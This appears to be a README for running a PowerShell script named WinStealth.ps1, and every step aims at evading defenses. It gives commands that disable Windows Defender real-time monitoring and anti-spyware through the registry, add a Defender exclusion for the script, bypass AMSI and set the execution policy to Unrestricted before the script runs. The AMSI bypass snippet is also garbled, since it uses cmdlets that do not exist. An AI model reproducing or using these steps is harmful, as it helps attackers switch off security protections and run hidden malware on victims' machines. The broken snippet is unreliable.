READ ME before running the .ps1 file:

Open an instance of notepad and copy the file contents in and save the file as WinStealth.ps1 and save it in this directory: C:\Users\Public\
	
In powershell run these commands: 
To disable Windows defender:
Set-MpPreference -DisableRealtimeMonitoring $true       or            
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force

To verify it's off:
Get-MpPreference | Select-Object DisableRealtimeMonitoring

To prevent Defender from deleting the script, exclude it:
Add-MpPreference -ExclusionPath "C:\Users\Public\WinStealth.ps1"

Defender’s Antimalware Scan Interface (AMSI) may still block the script. Run this bypass before executing (if possible):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') | 
Get-Field 'amsiInitFailed' -BindingFlags NonPublic,Static | 
Set-Value $null $true

Check the current execution policy:
Get-ExecutionPolicy

If it returns Restricted, change it:
Set-ExecutionPolicy Unrestricted -Scope Process -Force

Now, execute the script:
powershell -File C:\Users\Public\WinStealth.ps1
